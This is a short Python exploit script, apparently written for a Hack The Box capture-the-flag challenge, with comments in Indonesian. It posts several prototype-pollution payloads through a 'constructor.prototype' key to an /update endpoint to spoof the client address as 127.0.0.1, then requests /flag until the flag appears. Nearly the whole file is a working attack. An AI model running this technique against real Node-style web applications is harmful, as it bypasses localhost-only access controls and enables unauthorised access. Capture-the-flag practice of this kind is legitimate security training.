import requests

url = "http://154.57.164.72:30413"
note_id = "69bd5cfdbfd7d764fb35e9d9"

# Berbagai gadget prototype pollution untuk memalsukan IP
payloads = [
    {"remoteAddress": "127.0.0.1"},
    {"remoteAddress": "::ffff:127.0.0.1"},
    {"connection": {"remoteAddress": "127.0.0.1"}},
    {"socket": {"remoteAddress": "127.0.0.1"}},
    {"ip": "127.0.0.1"}
]

for p in payloads:
    # Kirim polusi
    requests.post(f"{url}/update", json={"noteId": note_id, "constructor": {"prototype": p}})
    # Cek hasil
    r = requests.get(f"{url}/flag")
    if "HTB{" in r.text:
        print(f"Success with payload {p}: {r.text}")
        break
    else:
        print(f"Failed with {p}")
